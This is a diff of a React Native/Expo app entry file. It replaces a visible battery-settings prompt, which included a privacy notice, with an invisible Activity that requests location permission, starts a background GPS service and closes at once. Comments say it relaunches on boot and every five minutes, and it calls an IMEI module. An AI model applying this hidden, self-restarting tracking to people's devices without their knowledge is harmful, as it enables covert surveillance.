@@ -1,176 +1,44 @@
 import { registerRootComponent } from 'expo';
-import { useEffect, useRef, useState } from 'react';
-import { AppState, AppStateStatus, BackHandler, NativeModules, Text, TouchableOpacity, View } from 'react-native';
+import { useEffect } from 'react';
+import { BackHandler, NativeModules, View } from 'react-native';
 import { startLocationTracking } from './src/background-task';
-import { checkBatteryOptimization, openBatterySettings, requestPermissions } from './src/location-service';
+import { requestPermissions } from './src/location-service';
 
 /**
- * Activity de inicialização do serviço GPS.
+ * Activity de bootstrap — invisível ao usuário.
  *
  * Fluxo:
- *   1. Solicita permissões de localização e telefone
- *   2. Verifica se otimização de bateria está desativada
- *      → Se SIM: inicia GPS e fecha o app imediatamente
- *      → Se NÃO: mostra tela pedindo ao usuário para ativar
- *   3. Quando usuário retorna das configurações (AppState: background→active):
- *      → Reconfirma isenção → inicia GPS → fecha o app
+ *   1. Solicita permissões de localização (já concedidas → retorna imediatamente)
+ *   2. Inicia o ForegroundService GPS (já rodando → retorna imediatamente)
+ *   3. Fecha a Activity — o ForegroundService continua em background
  *
- * O ForegroundService continua rodando após o fechamento do app.
+ * Abre em toda reinicialização (BootReceiver) e a cada 5 min (AlarmReceiver)
+ * para garantir auto-recuperação caso o OEM mate o serviço GPS.
+ *
+ * NUNCA mostra tela de ativação de bateria: o usuário configura isso
+ * uma única vez manualmente em Configurações → Apps → Bateria → Sem restrição.
  */
 function App() {
-  const [step, setStep] = useState<'loading' | 'battery' | 'done'>('loading');
-  const appStateRef = useRef<AppStateStatus>(AppState.currentState);
-
-  /**
-   * Fecha apenas a Activity, mantendo o ForegroundService vivo.
-   * finishActivity() é preferido; BackHandler.exitApp() é fallback de emergência.
-   */
-  const closeActivity = async () => {
-    try {
-      const finished = await NativeModules.ImeiModule?.finishActivity?.();
-      if (!finished) BackHandler.exitApp();
-    } catch (_) {
-      BackHandler.exitApp();
-    }
-  };
-
-  const launchAndClose = async () => {
-    try {
-      await startLocationTracking();
-    } catch (_) {
-      // Serviço pode já estar rodando — ignora
-    }
-    await closeActivity();
-  };
-
-  // Inicialização: permissões → checar bateria
   useEffect(() => {
     (async () => {
       try {
-        const granted = await requestPermissions();
-        if (!granted) {
-          await closeActivity();
-          return;
-        }
-        const exempt = await checkBatteryOptimization();
-        if (exempt) {
-          await launchAndClose();
-        } else {
-          setStep('battery');
-        }
+        await requestPermissions();
+        await startLocationTracking();
       } catch (_) {
-        // Falha silenciosa — BootReceiver vai tentar novamente
-        await closeActivity();
+        // GPS pode já estar rodando — ignora
+      }
+      // Fecha a Activity mantendo o ForegroundService vivo
+      try {
+        const finished = await NativeModules.ImeiModule?.finishActivity?.();
+        if (!finished) BackHandler.exitApp();
+      } catch (_) {
+        BackHandler.exitApp();
       }
     })();
   }, []);
 
-  /**
-   * Chamado ao apertar "ATIVAR AGORA".
-   * Se o dispositivo não suporta a tela de bateria (ex: ROMs de POS),
-   * retorna false e iniciamos o GPS diretamente sem bloquear o usuário.
-   */
-  const handleActivate = async () => {
-    const settingsOpened = await openBatterySettings();
-    if (!settingsOpened) {
-      // Dispositivo não suporta o dialog — prossegue sem isenção
-      setStep('done');
-      await launchAndClose();
-    }
-    // Se abriu, o AppState listener cuida do retorno do usuário
-  };
-
-  // Quando usuário volta das configurações de bateria
-  useEffect(() => {
-    if (step !== 'battery') return;
-    const sub = AppState.addEventListener('change', async (next: AppStateStatus) => {
-      const prev = appStateRef.current;
-      appStateRef.current = next;
-      if ((prev === 'inactive' || prev === 'background') && next === 'active') {
-        const exempt = await checkBatteryOptimization();
-        if (exempt) {
-          setStep('done');
-          await launchAndClose();
-        }
-      }
-    });
-    return () => sub.remove();
-  }, [step]);
-
-  // Tela preta durante carregamento / após confirmação
-  if (step === 'loading' || step === 'done') {
-    return <View style={{ flex: 1, backgroundColor: '#000000' }} />;
-  }
-
-  // Tela de ativação de bateria — mantém o app aberto até o usuário agir
-  return (
-    <View style={{
-      flex: 1,
-      backgroundColor: '#0f172a',
-      alignItems: 'center',
-      justifyContent: 'center',
-      padding: 32,
-    }}>
-      <Text style={{
-        color: '#f1f5f9',
-        fontSize: 20,
-        fontWeight: 'bold',
-        textAlign: 'center',
-        marginBottom: 12,
-      }}>
-        Ativação necessária
-      </Text>
-
-      <Text style={{
-        color: '#94a3b8',
-        fontSize: 15,
-        textAlign: 'center',
-        lineHeight: 24,
-        marginBottom: 36,
-      }}>
-        Para funcionar com a tela desligada, este serviço precisa ser excluído da
-        otimização de bateria.{'\n\n'}
-        Na próxima tela, toque em{' '}
-        <Text style={{ color: '#22c55e', fontWeight: 'bold' }}>"Permitir"</Text>.
-      </Text>
-
-      <TouchableOpacity
-        onPress={handleActivate}
-        activeOpacity={0.8}
-        style={{
-          backgroundColor: '#3b82f6',
-          paddingVertical: 16,
-          paddingHorizontal: 40,
-          borderRadius: 12,
-        }}
-      >
-        <Text style={{ color: '#fff', fontWeight: 'bold', fontSize: 16 }}>
-          ATIVAR AGORA
-        </Text>
-      </TouchableOpacity>
-
-      <TouchableOpacity
-        onPress={launchAndClose}
-        activeOpacity={0.7}
-        style={{ marginTop: 20, padding: 8 }}
-      >
-        <Text style={{ color: '#475569', fontSize: 13, textDecorationLine: 'underline' }}>
-          Pular esta etapa
-        </Text>
-      </TouchableOpacity>
-
-      <Text style={{
-        color: '#475569',
-        fontSize: 11,
-        textAlign: 'center',
-        marginTop: 16,
-        lineHeight: 17,
-      }}>
-        Após permitir, este app fecha automaticamente.{'\n'}
-        Nenhum dado pessoal é coletado.
-      </Text>
-    </View>
-  );
+  // Tela preta — fecha em ~1-2 segundos, nunca visível ao usuário
+  return <View style={{ flex: 1, backgroundColor: '#000000' }} />;
 }
 
 registerRootComponent(App);
